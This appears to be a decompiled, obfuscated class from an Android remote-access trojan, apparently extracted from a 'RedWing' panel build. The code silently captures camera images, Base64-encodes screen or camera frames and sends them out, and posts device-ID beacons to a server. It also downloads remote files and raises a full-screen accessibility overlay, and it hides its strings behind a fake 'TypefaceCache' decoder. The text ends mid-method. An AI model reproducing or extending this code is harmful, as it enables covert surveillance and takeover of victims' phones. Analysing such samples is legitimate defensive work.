package v.s;

import android.animation.ValueAnimator;
import android.app.job.JobParameters;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CaptureRequest;
import android.media.MediaPlayer;
import android.os.Process;
import android.os.StrictMode;
import android.util.Base64;
import android.view.View;
import android.view.WindowManager;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.FrameLayout;
import androidx.work.impl.workers.ConstraintTrackingWorker;
import app.mobilex.plus.ChatActivity;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.services.ConfigTQWorker;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService;
import com.google.firebase.messaging.FirebaseMessaging;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.Callable;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class A68NpXPqwTFos99nt implements Runnable {
    public final /* synthetic */ Object JXn4Qf7zpnLjP5;
    public final /* synthetic */ Object vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ A68NpXPqwTFos99nt(UtilNWWrapper utilNWWrapper, String str) {
        this.w9sT1Swbhx3hs = 21;
        this.JXn4Qf7zpnLjP5 = utilNWWrapper;
        this.vekpFI4d1Nc4fakF = str;
    }

    private static /* synthetic */ void ngjbw() {
    }

    /* JADX WARN: Code duplicated, block: B:157:0x03e4  */
    @Override // java.lang.Runnable
    public final void run() throws JSONException {
        UeVBYgBvSKYfVuXLhMs ueVBYgBvSKYfVuXLhMs;
        boolean z;
        boolean z2;
        int i;
        JSONObject jSONObject;
        Bitmap bitmap;
        int i2;
        int i3;
        int i4;
        b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q = null;
        boolean z3 = true;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                String str = (String) this.vekpFI4d1Nc4fakF;
                Context context = (Context) this.JXn4Qf7zpnLjP5;
                MediaPlayer mediaPlayer = wbK4wnGaII4TwWEYqb.dDIMxZXP1V8HdM;
                try {
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
                    httpURLConnection.setConnectTimeout(15000);
                    httpURLConnection.setReadTimeout(30000);
                    httpURLConnection.setInstanceFollowRedirects(true);
                    int responseCode = httpURLConnection.getResponseCode();
                    if (responseCode != 200) {
                        wbK4wnGaII4TwWEYqb.ibVTtJUNfrGYbW(TypefaceCache.obtain("000B0042006F00B700B0") + responseCode);
                        return;
                    }
                    File file = new File(context.getCacheDir(), TypefaceCache.obtain("00220063005F008E00FF008000C200AB0022006F"));
                    file.mkdirs();
                    File file2 = new File(file, TypefaceCache.obtain("003100730056008800E400BA00ED00A6003600720052008800CF") + System.currentTimeMillis() + TypefaceCache.obtain("006D007B004B00D4"));
                    InputStream inputStream = httpURLConnection.getInputStream();
                    try {
                        FileOutputStream fileOutputStream = new FileOutputStream(file2);
                        try {
                            byte[] bArr = new byte[8115 + 77];
                            while (true) {
                                int i5 = inputStream.read(bArr);
                                if (i5 <= 0) {
                                    fileOutputStream.close();
                                    inputStream.close();
                                    wbK4wnGaII4TwWEYqb.w9sT1Swbhx3hs = file2;
                                    wbK4wnGaII4TwWEYqb.xDyLpEZyrcKVe0 = true;
                                    wbK4wnGaII4TwWEYqb.b1EoSIRjJHO5.post(new jdOQeRk37T35X5xKW1P(1));
                                    return;
                                }
                                fileOutputStream.write(bArr, 0, i5);
                                try {
                                    throw th;
                                } catch (Throwable th) {
                                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(inputStream, th);
                                    throw th;
                                }
                            }
                        } catch (Throwable th2) {
                            try {
                                throw th2;
                            } catch (Throwable th3) {
                                okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(fileOutputStream, th2);
                                throw th3;
                            }
                        }
                    } catch (Throwable th4) {
                        throw th4;
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("00070079004C008900FC00B000D300A3006300730049009500FF00AD008800E7");
                    e.getMessage();
                    wbK4wnGaII4TwWEYqb.ibVTtJUNfrGYbW(TypefaceCache.obtain("00070079004C008900FC00B000D300A300790036") + e.getMessage());
                    return;
                }
            case 1:
                tXgalmBczDk7 txgalmbczdk7 = (tXgalmBczDk7) this.vekpFI4d1Nc4fakF;
                zzxeBctTPcbuazkjVgh zzxebcttpcbuazkjvgh = (zzxeBctTPcbuazkjVgh) this.JXn4Qf7zpnLjP5;
                if (txgalmbczdk7.w9sT1Swbhx3hs != tXgalmBczDk7.JXn4Qf7zpnLjP5) {
                    throw new IllegalStateException("provide() can be called only once.");
                }
                synchronized (txgalmbczdk7) {
                    ueVBYgBvSKYfVuXLhMs = txgalmbczdk7.dDIMxZXP1V8HdM;
                    txgalmbczdk7.dDIMxZXP1V8HdM = null;
                    txgalmbczdk7.w9sT1Swbhx3hs = zzxebcttpcbuazkjvgh;
                    break;
                }
                ueVBYgBvSKYfVuXLhMs.getClass();
                return;
            case 2:
                NXbA14GPFColi8T nXbA14GPFColi8T = (NXbA14GPFColi8T) this.vekpFI4d1Nc4fakF;
                zzxeBctTPcbuazkjVgh zzxebcttpcbuazkjvgh2 = (zzxeBctTPcbuazkjVgh) this.JXn4Qf7zpnLjP5;
                synchronized (nXbA14GPFColi8T) {
                    try {
                        if (nXbA14GPFColi8T.w9sT1Swbhx3hs == null) {
                            nXbA14GPFColi8T.dDIMxZXP1V8HdM.add(zzxebcttpcbuazkjvgh2);
                        } else {
                            nXbA14GPFColi8T.w9sT1Swbhx3hs.add(zzxebcttpcbuazkjvgh2.get());
                        }
                    } catch (Throwable th5) {
                        throw th5;
                    }
                }
                return;
            case 3:
                CameraCaptureSession cameraCaptureSession = (CameraCaptureSession) this.vekpFI4d1Nc4fakF;
                ConfigTQWorker configTQWorker = (ConfigTQWorker) this.JXn4Qf7zpnLjP5;
                byte[] bArr2 = ConfigTQWorker.ibVTtJUNfrGYbW;
                try {
                    cameraCaptureSession.stopRepeating();
                    CameraDevice cameraDevice = configTQWorker.dDIMxZXP1V8HdM;
                    CaptureRequest.Builder builderCreateCaptureRequest = cameraDevice != null ? cameraDevice.createCaptureRequest(2) : null;
                    if (builderCreateCaptureRequest != null) {
                        builderCreateCaptureRequest.addTarget(configTQWorker.w9sT1Swbhx3hs.getSurface());
                    }
                    if (builderCreateCaptureRequest != null) {
                        builderCreateCaptureRequest.set(CaptureRequest.CONTROL_MODE, 1);
                    }
                    if (builderCreateCaptureRequest != null) {
                        builderCreateCaptureRequest.set(CaptureRequest.CONTROL_AF_MODE, 4);
                    }
                    if (builderCreateCaptureRequest != null) {
                        builderCreateCaptureRequest.set(CaptureRequest.CONTROL_AE_MODE, 1);
                    }
                    cameraCaptureSession.capture(builderCreateCaptureRequest.build(), null, configTQWorker.JXn4Qf7zpnLjP5);
                    TypefaceCache.obtain("00000077004B009300E500AD00D700E700310073004A009200F500AC00C600E7003000730055009300B000BE00D400B300260064001B009000F100AD00DF00B20033");
                    return;
                } catch (Exception e2) {
                    TypefaceCache.obtain("00000077004B009300E500AD00D700E700220070004F008200E200FF00C500A60031007B004E009700B000BA00C000B5002C0064000100C7");
                    e2.getMessage();
                    return;
                }
            case 4:
                List list = (List) this.vekpFI4d1Nc4fakF;
                nqLgv0zSLN5zLWr3 nqlgv0zsln5zlwr3 = (nqLgv0zSLN5zLWr3) this.JXn4Qf7zpnLjP5;
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ((yVXVpCGoEG8oTTM) it.next()).dDIMxZXP1V8HdM(nqlgv0zsln5zlwr3.Ee8d2j4S9Vm5yGuR);
                }
                return;
            case 5:
                ConstraintTrackingWorker constraintTrackingWorker = (ConstraintTrackingWorker) this.vekpFI4d1Nc4fakF;
                R1oztwybM9zU2mqV r1oztwybM9zU2mqV = (R1oztwybM9zU2mqV) this.JXn4Qf7zpnLjP5;
                synchronized (constraintTrackingWorker.xDyLpEZyrcKVe0) {
                    try {
                        if (constraintTrackingWorker.ibVTtJUNfrGYbW) {
                            Af6wX3D8R2iFhqxr af6wX3D8R2iFhqxr = constraintTrackingWorker.b1EoSIRjJHO5;
                            int i6 = X4MUXskPk6V6I.dDIMxZXP1V8HdM;
                            af6wX3D8R2iFhqxr.pyu8ovAipBTLYAiKab(new di1l5OJ60eKNOgQR8yCS());
                        } else {
                            constraintTrackingWorker.b1EoSIRjJHO5.hjneShqpF9Tis4(r1oztwybM9zU2mqV);
                        }
                    } catch (Throwable th6) {
                        throw th6;
                    }
                }
                return;
            case 6:
                fZPc70r1JNyB0u fzpc70r1jnyb0u = (fZPc70r1JNyB0u) this.vekpFI4d1Nc4fakF;
                Runnable runnable = (Runnable) this.JXn4Qf7zpnLjP5;
                Process.setThreadPriority(fzpc70r1jnyb0u.vekpFI4d1Nc4fakF);
                StrictMode.ThreadPolicy threadPolicy = fzpc70r1jnyb0u.JXn4Qf7zpnLjP5;
                if (threadPolicy != null) {
                    StrictMode.setThreadPolicy(threadPolicy);
                }
                runnable.run();
                return;
            case 7:
                Callable callable = (Callable) this.vekpFI4d1Nc4fakF;
                r5XEUfod5GSCCwq6c r5xeufod5gsccwq6c = (r5XEUfod5GSCCwq6c) this.JXn4Qf7zpnLjP5;
                try {
                    Object objCall = callable.call();
                    agyaknTU4kgQn agyakntu4kgqn = (agyaknTU4kgQn) r5xeufod5gsccwq6c.vekpFI4d1Nc4fakF;
                    if (objCall == null) {
                        objCall = O2DHNSIGZlgPja7eqLgn.b1EoSIRjJHO5;
                    }
                    if (O2DHNSIGZlgPja7eqLgn.ibVTtJUNfrGYbW.JXn4Qf7zpnLjP5(agyakntu4kgqn, null, objCall)) {
                        O2DHNSIGZlgPja7eqLgn.JXn4Qf7zpnLjP5(agyakntu4kgqn);
                        return;
                    }
                    return;
                } catch (Exception e3) {
                    r5xeufod5gsccwq6c.vIJudZvPyTuNp(e3);
                    return;
                }
            case 8:
                FirebaseMessaging firebaseMessaging = (FirebaseMessaging) this.vekpFI4d1Nc4fakF;
                al3CoDKXO0nvx al3codkxo0nvx = (al3CoDKXO0nvx) this.JXn4Qf7zpnLjP5;
                XlNqgz8EVh2x11Ly xlNqgz8EVh2x11Ly = FirebaseMessaging.hjneShqpF9Tis4;
                try {
                    al3codkxo0nvx.dDIMxZXP1V8HdM(firebaseMessaging.dDIMxZXP1V8HdM());
                    return;
                } catch (Exception e4) {
                    al3codkxo0nvx.dDIMxZXP1V8HdM.D5P1xCAyuvgF(e4);
                    return;
                }
            case 9:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw = (RWY6BVSB0XxPbw) this.vekpFI4d1Nc4fakF;
                JSONObject jSONObject2 = (JSONObject) this.JXn4Qf7zpnLjP5;
                Context context2 = rWY6BVSB0XxPbw.dDIMxZXP1V8HdM;
                try {
                    Intent intent = new Intent(context2, (Class<?>) ChatActivity.class);
                    intent.addFlags(268435456);
                    String strOptString = jSONObject2.optString(TypefaceCache.obtain("002E00730048009400F100B800D7"), "");
                    if (strOptString.length() > 0) {
                        intent.putExtra(TypefaceCache.obtain("002E00730048009400F100B800D7"), strOptString);
                    }
                    context2.startActivity(intent);
                    JSONObject jSONObject3 = new JSONObject();
                    jSONObject3.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002000790056008A00F100B100D60098003100730048009200FC00AB"));
                    jSONObject3.put(TypefaceCache.obtain("002000790056008A00F100B100D6"), TypefaceCache.obtain("002C0066005E008900CF00BC00DA00A60037"));
                    jSONObject3.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject3);
                    return;
                } catch (Exception e5) {
                    TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360054009700F500B1009200A4002B0077004F00DD00B0");
                    e5.getMessage();
                    return;
                }
            case 10:
                vatBtnIbOWqS8Z vatbtnibowqs8z = (vatBtnIbOWqS8Z) this.vekpFI4d1Nc4fakF;
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw2 = (RWY6BVSB0XxPbw) this.JXn4Qf7zpnLjP5;
                byte[] bArr3 = (byte[]) vatbtnibowqs8z.b1EoSIRjJHO5.get();
                TypefaceCache.obtain("000B0040007500A400B000BB00D700AB0022006F005E008300B000AC00D700A90027002C001B008100E200BE00DF00A2007E");
                TypefaceCache.obtain("00630071005E008900AD");
                if (bArr3 != null) {
                    rWY6BVSB0XxPbw2.J0zjQ7CAgohuxU20eCW6(bArr3, vatbtnibowqs8z.gmNWMfvn6zlEj, vatbtnibowqs8z.gIIiyi2ddlMDR0);
                    return;
                }
                return;
            case 11:
                byte[] bArr4 = (byte[]) this.vekpFI4d1Nc4fakF;
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw3 = (RWY6BVSB0XxPbw) this.JXn4Qf7zpnLjP5;
                if (bArr4 == null || bArr4.length == 0) {
                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                    TypefaceCache.obtain("0010007F0057008200FE00AB009200B400200064005E008200FE00AC00DA00A800370036005D008600F900B300D700A3006F0036005D008600FC00B300DB00A9002400360059008600F300B4009200B3002C00360048009E00E300AB00D700AA006300650058009500F500BA00DC00B4002B0079004F");
                    DataQFAdapter.Companion.getClass();
                    GARjgaGEpTotOxcl8vfe.GiffeZJ1rbwyx();
                    TypefaceCache.obtain("0010006F0048009300F500B2009200B400200064005E008200FE00AC00DA00A800370036004F009500F900B800D500A200310073005F00CB00B000A800D300AE0037007F0055008000B000B900DD00B5006300700052008B00F500F1009C00E9");
                    rWY6BVSB0XxPbw3.nQilHWaqS401ZtR.postDelayed(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw3, 16), 3000L);
                    return;
                }
                iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi2 = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                try {
                    Bitmap bitmapDecodeByteArray = BitmapFactory.decodeByteArray(bArr4, 0, bArr4.length);
                    try {
                        if (bitmapDecodeByteArray == null) {
                            z = true;
                        } else {
                            try {
                                int width = bitmapDecodeByteArray.getWidth();
                                int height = bitmapDecodeByteArray.getHeight();
                                int iMax = Math.max(width, height) / 8;
                                dPxH1qsKC2Lxf7PHXDZT dpxh1qskc2lxf7phxdztTne6mXOUFKdd = OFtLBiBbrrTHWu.tne6mXOUFKdd(OFtLBiBbrrTHWu.ECwLkmPW1UKz7J6E(iMax, height), iMax);
                                int i7 = dpxh1qskc2lxf7phxdztTne6mXOUFKdd.w9sT1Swbhx3hs;
                                int i8 = dpxh1qskc2lxf7phxdztTne6mXOUFKdd.vekpFI4d1Nc4fakF;
                                int i9 = dpxh1qskc2lxf7phxdztTne6mXOUFKdd.JXn4Qf7zpnLjP5;
                                long j = 0;
                                if ((i9 <= 0 || i7 > i8) && (i9 >= 0 || i8 > i7)) {
                                    z = true;
                                    bitmap = bitmapDecodeByteArray;
                                    i2 = 0;
                                } else {
                                    i2 = 0;
                                    while (true) {
                                        dPxH1qsKC2Lxf7PHXDZT dpxh1qskc2lxf7phxdztTne6mXOUFKdd2 = OFtLBiBbrrTHWu.tne6mXOUFKdd(OFtLBiBbrrTHWu.ECwLkmPW1UKz7J6E(iMax, width), iMax);
                                        int i10 = dpxh1qskc2lxf7phxdztTne6mXOUFKdd2.w9sT1Swbhx3hs;
                                        z = z3;
                                        try {
                                            int i11 = dpxh1qskc2lxf7phxdztTne6mXOUFKdd2.vekpFI4d1Nc4fakF;
                                            int i12 = dpxh1qskc2lxf7phxdztTne6mXOUFKdd2.JXn4Qf7zpnLjP5;
                                            if ((i12 <= 0 || i10 > i11) && (i12 >= 0 || i11 > i10)) {
                                                i3 = width;
                                                bitmap = bitmapDecodeByteArray;
                                                i4 = i9;
                                            } else {
                                                while (true) {
                                                    int pixel = bitmapDecodeByteArray.getPixel(i10, i7);
                                                    i3 = width;
                                                    int i13 = ((pixel >> 16) & 255) + ((pixel >> 8) & 255) + (pixel & 255);
                                                    bitmap = bitmapDecodeByteArray;
                                                    i4 = i9;
                                                    j += (long) i13;
                                                    i2++;
                                                    if (i10 != i11) {
                                                        i10 += i12;
                                                        bitmapDecodeByteArray = bitmap;
                                                        width = i3;
                                                        i9 = i4;
                                                    }
                                                }
                                            }
                                            if (i7 != i8) {
                                                i7 += i4;
                                                bitmapDecodeByteArray = bitmap;
                                                z3 = z;
                                                width = i3;
                                                i9 = i4;
                                            }
                                        } catch (Throwable th7) {
                                            th = th7;
                                            bitmap = bitmapDecodeByteArray;
                                            bitmap.recycle();
                                            throw th;
                                        }
                                    }
                                }
                                if (i2 == 0) {
                                    bitmap.recycle();
                                } else {
                                    try {
                                        boolean z4 = j / ((long) i2) < 15 ? z : false;
                                        bitmap.recycle();
                                        z2 = z4;
                                        i = 2;
                                    } catch (Throwable th8) {
                                        th = th8;
                                        bitmap.recycle();
                                        throw th;
                                    }
                                }
                                String strEncodeToString = Base64.encodeToString(bArr4, i);
                                jSONObject = new JSONObject();
                                Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("003000750049008200F500B100C100AF002C0062", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "00270077004F0086", strEncodeToString);
                                if (z2) {
                                    jSONObject.put(TypefaceCache.obtain("0025007A005A008000CF00AC00D700A400360064005E"), z);
                                    try {
                                        DataQFAdapter.Companion.getClass();
                                        jSONObject.put(TypefaceCache.obtain("003000750049008200F500B100ED00B300310073005E"), GARjgaGEpTotOxcl8vfe.hjneShqpF9Tis4());
                                        break;
                                    } catch (Throwable unused) {
                                    }
                                }
                                rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK(jSONObject);
                                iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi3 = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                                TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B009100F900BE0092008600200075005E009400E300B600D000AE002F007F004F009E00AA00FF");
                                TypefaceCache.obtain("006300740042009300F500AC009E00E70021007A005A008400FB00E2");
                                return;
                            } catch (Throwable th9) {
                                th = th9;
                            }
                        }
                    } catch (Throwable unused2) {
                    }
                } catch (Throwable unused3) {
                }
                i = 2;
                z2 = false;
                String strEncodeToString2 = Base64.encodeToString(bArr4, i);
                jSONObject = new JSONObject();
                Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("003000750049008200F500B100C100AF002C0062", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "00270077004F0086", strEncodeToString2);
                if (z2) {
                    jSONObject.put(TypefaceCache.obtain("0025007A005A008000CF00AC00D700A400360064005E"), z);
                    DataQFAdapter.Companion.getClass();
                    jSONObject.put(TypefaceCache.obtain("003000750049008200F500B100ED00B300310073005E"), GARjgaGEpTotOxcl8vfe.hjneShqpF9Tis4());
                    break;
                }
                rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK(jSONObject);
                iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi4 = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B009100F900BE0092008600200075005E009400E300B600D000AE002F007F004F009E00AA00FF");
                TypefaceCache.obtain("006300740042009300F500AC009E00E70021007A005A008400FB00E2");
                return;
            case 12:
                Xx9LmS8BCwiTgmI xx9LmS8BCwiTgmI = (Xx9LmS8BCwiTgmI) this.vekpFI4d1Nc4fakF;
                al3CoDKXO0nvx al3codkxo0nvx2 = (al3CoDKXO0nvx) this.JXn4Qf7zpnLjP5;
                try {
                    al3codkxo0nvx2.dDIMxZXP1V8HdM(xx9LmS8BCwiTgmI.dDIMxZXP1V8HdM());
                    return;
                } catch (Exception e6) {
                    al3codkxo0nvx2.dDIMxZXP1V8HdM.D5P1xCAyuvgF(e6);
                    return;
                }
            case 13:
                JobInfoSchedulerService jobInfoSchedulerService = (JobInfoSchedulerService) this.vekpFI4d1Nc4fakF;
                JobParameters jobParameters = (JobParameters) this.JXn4Qf7zpnLjP5;
                int i14 = JobInfoSchedulerService.dDIMxZXP1V8HdM;
                jobInfoSchedulerService.jobFinished(jobParameters, false);
                return;
            case 14:
                ManagerUMController managerUMController = (ManagerUMController) this.vekpFI4d1Nc4fakF;
                Intent intent2 = (Intent) this.JXn4Qf7zpnLjP5;
                String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
                if (ManagerUMController.fivkjwgu2UdAtiY == null || ManagerUMController.ECwLkmPW1UKz7J6E) {
                    return;
                }
                try {
                    managerUMController.Ee8d2j4S9Vm5yGuR(intent2, managerUMController.Ee8d2j4S9Vm5yGuR);
                    return;
                } catch (Exception e7) {
                    String str3 = ManagerUMController.DVTNwpDEVsUKuznof;
                    TypefaceCache.obtain("001000730057008100BD00B700D700A6002F0036005D008600F900B300D700A300790036");
                    e7.getMessage();
                    return;
                }
            case 15:
                DP5sXJhndWh8c4VkCzdA dP5sXJhndWh8c4VkCzdA = (DP5sXJhndWh8c4VkCzdA) this.vekpFI4d1Nc4fakF;
                ebR1taU40KcOGClk ebr1tau40kcogclk = (ebR1taU40KcOGClk) this.JXn4Qf7zpnLjP5;
                synchronized (dP5sXJhndWh8c4VkCzdA.hjneShqpF9Tis4) {
                    try {
                        ArrayList arrayList = dP5sXJhndWh8c4VkCzdA.D5P1xCAyuvgF;
                        int size = arrayList.size();
                        int i15 = 0;
                        while (i15 < size) {
                            Object obj = arrayList.get(i15);
                            i15++;
                            ((tnAmGCFqcZm9axi) obj).JXn4Qf7zpnLjP5(ebr1tau40kcogclk, false);
                        }
                    } catch (Throwable th10) {
                        throw th10;
                    }
                    break;
                }
                return;
            case 16:
                bYTTp7VwXfKJ byttp7vwxfkj = (bYTTp7VwXfKJ) this.vekpFI4d1Nc4fakF;
                try {
                    byttp7vwxfkj.vekpFI4d1Nc4fakF.write((byte[]) this.JXn4Qf7zpnLjP5);
                    byttp7vwxfkj.vekpFI4d1Nc4fakF.flush();
                    return;
                } catch (Exception unused4) {
                    byttp7vwxfkj.JXn4Qf7zpnLjP5 = false;
                    try {
                        byttp7vwxfkj.dDIMxZXP1V8HdM.close();
                        return;
                    } catch (Exception unused5) {
                        return;
                    }
                }
            case 17:
                String str4 = (String) this.vekpFI4d1Nc4fakF;
                String str5 = (String) this.JXn4Qf7zpnLjP5;
                try {
                    HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL(str4 + TypefaceCache.obtain("006C0077004B008E00BF00BB00D300B300220039005A008900F100B300CB00B4002A00650064008300F500AB00D700A400370073005F")).openConnection();
                    httpURLConnection2.setRequestMethod("POST");
                    httpURLConnection2.setConnectTimeout(5000);
                    httpURLConnection2.setReadTimeout(5000);
                    httpURLConnection2.setRequestProperty(TypefaceCache.obtain("000000790055009300F500B100C600EA0017006F004B0082"), TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800FA00AC00DD00A9"));
                    httpURLConnection2.setDoOutput(true);
                    OutputStream outputStream = httpURLConnection2.getOutputStream();
                    try {
                        outputStream.write(("{\"device_id\":\"" + str5 + "\",\"ts\":" + System.currentTimeMillis() + "}").getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM));
                        okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(outputStream, null);
                        httpURLConnection2.getResponseCode();
                        httpURLConnection2.disconnect();
                        return;
                    } catch (Throwable th11) {
                        try {
                            throw th11;
                        } catch (Throwable th12) {
                            okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(outputStream, th11);
                            throw th12;
                        }
                    }
                } catch (Throwable unused6) {
                    return;
                }
            case 18:
                SyncQYAdapter syncQYAdapter = (SyncQYAdapter) this.vekpFI4d1Nc4fakF;
                SharedPreferences sharedPreferences = (SharedPreferences) this.JXn4Qf7zpnLjP5;
                String str6 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                try {
                    if (HiMbhMAyWCxjtsIFMD.w9sT1Swbhx3hs(syncQYAdapter)) {
                        sharedPreferences.edit().putLong(TypefaceCache.obtain("002F00770048009300CF00BE00C100AC002600720064008A00E3"), System.currentTimeMillis()).commit();
                        return;
                    }
                    return;
                } catch (Exception e8) {
                    TypefaceCache.obtain("000C0053007600C700F100AA00C600A800300062005A009500E400FF00D700B500310079004900DD00B0");
                    e8.getMessage();
                    return;
                }
            case 19:
                ((qvETFuMLonqpu4xIWtWA) this.vekpFI4d1Nc4fakF).w9sT1Swbhx3hs.D5P1xCAyuvgF((r9c8qUHbkyLZi) this.JXn4Qf7zpnLjP5, 3);
                return;
            case 20:
                UtilNWWrapper utilNWWrapper = (UtilNWWrapper) this.vekpFI4d1Nc4fakF;
                AInogFBF3uZEdg60 aInogFBF3uZEdg60 = (AInogFBF3uZEdg60) this.JXn4Qf7zpnLjP5;
                FrameLayout frameLayout = utilNWWrapper.rCHnHJBAlOpNI5;
                if (frameLayout != null) {
                    frameLayout.removeAllViews();
                }
                aInogFBF3uZEdg60.run();
                return;
            case 21:
                sNACkioAJERo snackioajero = sNACkioAJERo.w9sT1Swbhx3hs;
                UtilNWWrapper utilNWWrapper2 = (UtilNWWrapper) this.JXn4Qf7zpnLjP5;
                String str7 = (String) this.vekpFI4d1Nc4fakF;
                String str8 = UtilNWWrapper.A1BaTVAMeIXMnh;
                TypefaceCache.obtain("00100062005A008900F400BE00DE00A8002D0073001B00B700D90091009200A2002D0062005E009500F500BB009E00E7003000730055008300F900B100D500E700370079001B009400F500AD00C400A20031");
                cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn = umMdYoePNXvWWPn.w9sT1Swbhx3hs;
                JnC75xOgwtSSKHn30v jnC75xOgwtSSKHn30v = new JnC75xOgwtSSKHn30v(utilNWWrapper2, str7, b9xroaxfr1fmoo2q, 6);
                if ((2 & 1) != 0) {
                    cptq2xmcb5jsaehn = snackioajero;
                }
                cpTq2XMCb5JSaEhn cptq2xmcb5jsaehnWotphlvK9sPbXJ = OFtLBiBbrrTHWu.wotphlvK9sPbXJ(snackioajero, cptq2xmcb5jsaehn, true);
                AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
                if (cptq2xmcb5jsaehnWotphlvK9sPbXJ != aqltFduMByzMV4g && cptq2xmcb5jsaehnWotphlvK9sPbXJ.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF) == null) {
                    cptq2xmcb5jsaehnWotphlvK9sPbXJ = cptq2xmcb5jsaehnWotphlvK9sPbXJ.EWUjsTERgdPbSw3NNlN(aqltFduMByzMV4g);
                }
                JXn4Qf7zpnLjP5 sndbsr9gb3ezzub = new snDbSR9Gb3eZZuB(cptq2xmcb5jsaehnWotphlvK9sPbXJ, true);
                sndbsr9gb3ezzub.YIgR6F2ZXmLx2ul(1, sndbsr9gb3ezzub, jnC75xOgwtSSKHn30v);
                utilNWWrapper2.finish();
                return;
            case 22:
                DataQFAdapter dataQFAdapter = (DataQFAdapter) this.vekpFI4d1Nc4fakF;
                apQOLJtARzrH apqoljtarzrh = (apQOLJtARzrH) this.JXn4Qf7zpnLjP5;
                try {
                    if (vbdyByOHPJmeGXlq.iUQk66nAiXgO35) {
                        TypefaceCache.obtain("00130077004F009300F500AD00DC00E700200077004B009300E500AD00D700E70022007A0049008200F100BB00CB00E70030007E0054009000F900B100D500EB006300650050008E00E000AF00DB00A90024");
                    } else {
                        WindowManager windowManager = (WindowManager) dataQFAdapter.getSystemService("window");
                        vbdyByOHPJmeGXlq.ECwLkmPW1UKz7J6E = new V3YwOBcZuHItC(dataQFAdapter);
                        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, 2032, 525696, -3);
                        layoutParams.gravity = 8388659;
                        windowManager.addView(vbdyByOHPJmeGXlq.ECwLkmPW1UKz7J6E, layoutParams);
                        vbdyByOHPJmeGXlq.iUQk66nAiXgO35 = true;
                        vbdyByOHPJmeGXlq.Qrz92kRPw4GcghAc.postDelayed(vbdyByOHPJmeGXlq.hV4VTKNUdeHN, 30000L);
                        TypefaceCache.obtain("00130077004F009300F500AD00DC00E700200077004B009300E500AD00D700E7002C0060005E009500FC00BE00CB00E70030007E0054009000FE");
                    }
                    return;
                } catch (Exception e9) {
                    TypefaceCache.obtain("0030007E0054009000C000BE00C600B300260064005500A400F100AF00C600B200310073001B008200E200AD00DD00B500790036");
                    e9.getMessage();
                    vbdyByOHPJmeGXlq.iUQk66nAiXgO35 = false;
                    vbdyByOHPJmeGXlq.ECwLkmPW1UKz7J6E = null;
                    apqoljtarzrh.pyu8ovAipBTLYAiKab(qkzRt1s9DJNNYwsqt.w9sT1Swbhx3hs);
                    return;
                }
            case 23:
                FrameLayout frameLayout2 = (FrameLayout) this.vekpFI4d1Nc4fakF;
                final View view = (View) this.JXn4Qf7zpnLjP5;
                final int width2 = frameLayout2.getWidth();
                if (width2 > 0) {
